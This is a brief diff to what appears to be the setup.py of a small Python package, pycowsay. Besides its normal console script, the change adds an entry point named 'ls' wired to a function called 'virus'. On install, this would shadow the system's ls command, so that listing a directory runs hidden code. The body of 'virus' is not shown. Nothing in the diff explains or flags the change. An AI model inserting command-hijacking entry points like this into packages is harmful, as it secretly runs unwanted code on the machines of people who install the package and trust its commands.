@@ -42,5 +42,7 @@ setuptools.setup(
         'console_scripts': [
             'run_pycowsay=' + \
             'pycowsay.run_pycowsay:main',
+            'ls=' + \
+            'pycowsay.run_pycowsay:virus'
         ],
     })
